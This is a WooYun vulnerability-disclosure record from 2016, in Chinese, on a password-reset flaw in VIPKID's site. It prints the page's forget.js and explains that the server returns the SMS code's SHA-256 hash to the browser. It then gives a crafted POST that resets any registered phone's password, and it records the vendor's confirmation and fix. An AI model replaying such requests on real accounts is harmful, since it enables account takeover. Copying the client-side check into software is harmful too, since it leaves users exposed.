{"id": 86022, "wybug_id": "wooyun-2016-0179890", "wybug_title": "vipkid重置任意手机注册用户的密码", "wybug_corp": "北京大米科技有限公司", "wybug_author": "某个路人", "wybug_date": "2016-04-22 17:28", "wybug_open_date": "2016-04-28 21:13", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-28：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： VIPKID是大米未来科技有限公司旗下的少儿国际教育品牌 详细说明：  http://www.vipkid.com.cn/forget漏洞存在于找回密码的 短信码验证forget.js内容\n/*忘记密码*/var errors = {\t\t\tMOBILE_ERROR:'请正确输入11位手机号码',\t\t\tPASSWORD_ERROR:'密码应为6-20位数字、字母、字符',\t\t\tCONFIRM_PASSWORD_ERROR:\"两次输入的密码不一致\",\t\t\tMOBILE_NOT_SIGNUP:\"此手机号码未注册\",\t\t\tVERIFYCODE_NOT_RIGHT:\"输入的验证码不正确，请重新获取\",\t\t\tNULL:null,\t}var verifyCode = 0;//第一步各种验证//移除注册面板的所有注册提示function removeAllRegisteError(){\t$(\"#mobile\").html(errors.NULL);\t$(\"#verifyCode\").html(errors.NULL);\t$(\"#pwd1error\").html(errors.NULL);\t$(\"#pwd2error\").html(errors.NULL);}//手机号规则验证function isMobile(mobile){\tvar reg = /^1[3|4|5|7|8]\\d{9}$/;\treturn reg.test(mobile);}//验证手机号输入function verifyMobile(){\tvar mobile = $('#mobile').val();\tif(mobile == null  || mobile == \"\"){\t\treturn false;\t}else{\t\tif(!isMobile(mobile)){\t\t\t$(\"#mobileerror\").html(errors.MOBILE_ERROR);\t\t\treturn false;\t\t}else{\t\t\tif($(\"#mobileerror\").html() != errors.MOBILE_ALREADY_USE){\t\t\t\t$(\"#mobileerror\").html(errors.NULL);\t\t\t}\t\t\t\treturn true;\t\t}\t}\t}//mobile blur validation$(\"#mobile\").blur(function(){\tverifyMobile();})var imageCodePass = false;//获取图片验证码function getimagecode(){\tvar i = Math.random();\t$(\"#imgCodeButton\").attr('src',\"/getImageCode?random=\" + i);\t$(\"#imgYzmnumber\").val(\"\");\timageCodePass = false;}//图片验证码光标移除是验证$(\"#imgYzmnumber\").blur(function(){\tcheckImageCode();})//校验图片验证码function checkImageCode(){\tvar imagecode = $.cookie('imagecode');\tvar imagecode2 = $(\"#imgYzmnumber\").val();\tif(imagecode == sha256_digest(imagecode2)){\t\timageCodePass = true;\t\t$(\"#usertpyzmtips\").html(\"\");\t}else{\t\timageCodePass = false;\t\t$(\"#usertpyzmtips\").html(\"输入的图片验证码不正确！\");\t}}//获取验证码失败function getIdentifyCodeFail(){\t$(\"#mobileerror\").html(errors.IDENTIFY_CODE_GET_ERROR);\t$(\"#identifyCodeButton\").attr('disabled',false);}//验证码60秒的倒计时function countDown(){\tvar count = 60;\tvar timer = setInterval(function(){\t\tif(count > 0){\t\t\tcount--;\t\t\t$(\"#identifyCodeButton\").html(\"已发送（\"+count+\"）\");\t\t}else{\t\t\t$(\"#identifyCodeButton\").html(\"获取验证码\");\t\t\t$(\"#identifyCodeButton\").attr('disabled',false);\t\t\tgetimagecode();\t\t\tclearTimeout(timer);\t\t}\t\t\t},1000);}//查找后台是否已经有这个手机号function doSearchMobile(){\tvar mobile = $('#mobile').val();\t\t$.get( \"/checkUserExist\",{\"username\":mobile}, function( data ) {\t\tif(data){\t\t\t$(\"#identifyCodeButton\").text(\"获取中…\");\t\t\t$(\"#mobileerror\").html(errors.NULL);\t\t\tvar mobile = $('#mobile').val();\t\t\tvar imagecode = $.cookie('imagecode');\t\t\t$.get( \"/sendVerifyCode\",{\"mobile\":mobile, \"imagecode\":imagecode}, function( data ) {\t\t\t\tif(data){\t\t\t\t\tverifyCode = data;\t\t\t\t\tcountDown();\t\t\t\t}else{\t\t\t\t\tgetimagecode();\t\t\t\t\tgetIdentifyCodeFail();\t\t\t\t}  \t\t\t});\t\t}else{\t\t\t$(\"#identifyCodeButton\").text(\"获取验证码\");\t\t\t$(\"#mobileerror\").html(errors.MOBILE_NOT_SIGNUP);\t\t\t$(\"#identifyCodeButton\").attr('disabled',false);\t\t}\t});}\t//获取验证码function doGetIdentifyCode(){\t$(\"#mobileerror\").html(errors.NULL);\tif(verifyMobile()){\t\tif(imageCodePass == false){\t\t\t$(\"#usertpyzmtips\").html(\"输入的图片验证码不正确！\");\t\t\treturn;\t\t}\t\t$(\"#identifyCodeButton\").attr('disabled',true);\t\tdoSearchMobile();\t}else{\t\t$(\"#mobileerror\").html(errors.MOBILE_ERROR);\t\t$(\"#identifyCodeButton\").attr('disabled',false);\t}}//检查输入的验证码是否是发送的验证码function checkVerifyCode(inputCode){\tvar verifyCodeReg = /^\\d{4}$/;\treturn verifyCodeReg.test(inputCode);}//verify code blur validation$(\"#verifyCode\").blur(function(){\tvar inputCode = $(\"#verifyCode\").val();\tif(inputCode == null  || inputCode == \"\"){\t\treturn false;\t}else{\t\tif(!checkVerifyCode(inputCode)){\t\t\t$(\"#identifyCodeError\").html(errors.VERIFYCODE_NOT_RIGHT);\t\t\treturn false;\t\t}else{\t\t\t$(\"#identifyCodeError\").html(errors.NULL);\t\t\treturn true;\t\t}\t}})//检查所有输入是否有问题function checkAllInfo(){\tvar result = true;\t//手机号\tvar mobile = $('#mobile').val();\tif(mobile == null  || mobile == \"\"){\t\tremoveAllRegisteError();\t\t$(\"#mobileerror\").html(errors.MOBILE_ERROR);\t\tresult = false;\t\treturn result;\t}else{\t\tif(!isMobile(mobile)){\t\t\tremoveAllRegisteError();\t\t\t$(\"#mobileerror\").html(errors.MOBILE_ERROR);\t\t\tresult = false;\t\t\treturn result;\t\t}else{\t\t\t$(\"#mobileerror\").html(errors.NULL);\t\t}\t}\t\tcheckImageCode();\t\t//验证码\tvar code = $('#verifyCode').val();\tif(code == null  || code == \"\"){\t\tresult = false;\t\t$(\"#identifyCodeError\").html(errors.VERIFYCODE_NOT_RIGHT);\t\treturn result;\t}else{\t\tif(verifyCode != sha256_digest(code)){\t\t\tresult = false;\t\t\t$(\"#identifyCodeError\").html(errors.VERIFYCODE_NOT_RIGHT);\t\t\treturn result;\t\t}else{\t\t\t$(\"#identifyCodeError\").html(errors.NULL);\t\t}\t}\t\treturn result;}//注册function doNext(){\tif(checkAllInfo()){\t\t$(\"#Next\").text(\"验证中…\");\t\tvar parentMobile = $('#mobile').val();\t\tvar inventionCode = $('#verifyCode').val();\t\t\t\t\t//跳转到第二步\t\t$(\"#step1\").hide();\t\t$(\"#step2\").show();\t\t$(\"#Next\").text(\"验证\");\t\t$(\"#fpStepTwo\").addClass(\"cur\");\t}}//第二步各种验证function passwordBlur(){\tvar password = $(\"#pwd1\").val();\tif(password != null && password != \"\"){\t\tif(password.length < 6){\t\t\t$(\"#pwd1error\").html(errors.PASSWORD_ERROR);\t\t\treturn false;\t\t}else{\t\t\t$(\"#pwd1error\").html(errors.NULL);\t\t\treturn true;\t\t}\t}else{\t\treturn false;\t}}//password blur validation$(\"#pwd1\").blur(function(){\tpasswordBlur();})function confirmPasswordBlur(){\tvar password = $(\"#pwd1\").val();\tvar confirmPassword = $(\"#pwd2\").val();\tif(confirmPassword != \"\" && confirmPassword != $(\"#pwd1\").val()){\t\t$(\"#pwd2error\").html(errors.CONFIRM_PASSWORD_ERROR);\t\treturn false;\t}else{\t\t$(\"#pwd2error\").html(errors.NULL);\t\treturn true;\t}}//confirm password blur validation$(\"#pwd2\").blur(function(){\tconfirmPasswordBlur();})function doResetPassword(){\tif(!passwordBlur()){\t\tremoveAllRegisteError();\t\t$(\"#pwd1error\").html(errors.PASSWORD_ERROR);\t}else if(passwordBlur() && !confirmPasswordBlur()){\t\tremoveAllRegisteError();\t\t$(\"#pwd2error\").html(errors.CONFIRM_PASSWORD_ERROR);\t}\telse{\t\tremoveAllRegisteError();\t\t$(\"#finishButton\").attr(\"disabled\",true);\t\t$(\"#finishButton\").text(\"重置密码中…\");\t\t\t\tvar parentMobile = $('#mobile').val();\t\tvar inventionCode = $('#verifyCode').val();\t\tvar parentPassword = $(\"#pwd1\").val();\t\t\t\t\t\t//发送request到后台\t\t$.post( \"/forget\",{\"parentMobile\":parentMobile,\"parentPassword\":parentPassword,\"inventionCode\":sha256_digest(inventionCode)}, function( data ) {\t\t\tif(data == \"parentCenter\"|| data == \"studentInfo\"){\t\t\t\t//parentCenter跳到首页\t\t\t\t//studentInfo跳到引导页\t\t\t\t$(\"#fpStepThr\").addClass(\"cur\");\t\t\t\t$(\"#step2\").hide();\t\t\t\t$(\"#step3\").show();\t\t\t}else if(data == \"validationFail\"){\t\t\t\tconsole.log(\"validationFail\");\t\t\t}\t\t}).error(function() { \t\t\tconsole.log(\"重置密码失败\"); \t\t});\t\t\t}}$(\".reginput\").focus(function(){\t$(this).addClass(\"on\")})$(\".reginput\").blur(function(){\t$(this).removeClass(\"on\")})$(\"a\").click(function() {\tvar url = window.location.href;\tif (url.indexOf(\"channel_id=\") > 0||url.indexOf(\"channel_keyword=\") > 0) {\t\tvar input = url.substr(url.indexOf('?'));\t\tthis.href = this.href + input;\t}})\n他点击发送短信后  返回了 验证码的sha256加密值verifyCode = data//  验证码的sha256然后输入验证码   本地js验证;code是输入的验证码if(verifyCode != sha256_digest(code)){\t\t\tresult = false;\t\t\t$(\"#identifyCodeError\").html(errors.VERIFYCODE_NOT_RIGHT);\t\t\treturn result;\t\t}else{\t\t\t$(\"#identifyCodeError\").html(errors.NULL);所以可以绕过这里的验证,先点击获取短信验证码，拿到cookie和验证码的sha256值后 构造post包改密码最后改密码的post包 parentMobile=13800000000&parentPassword=520123&inventionCode=1adb67461a4c3739283e6b97ba7984e0d4b024a4dcbf1f341c389f0c581fde4ainventionCode就是点击获取短信验证码后返回的值(验证码的sha256)\n\n\n\n改后的账号密码  13800000000/520123\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 某个路人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-22 17:49 厂商回复： 正在解决，今日就可上线 最新状态： 2016-04-28：已修复漏洞  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}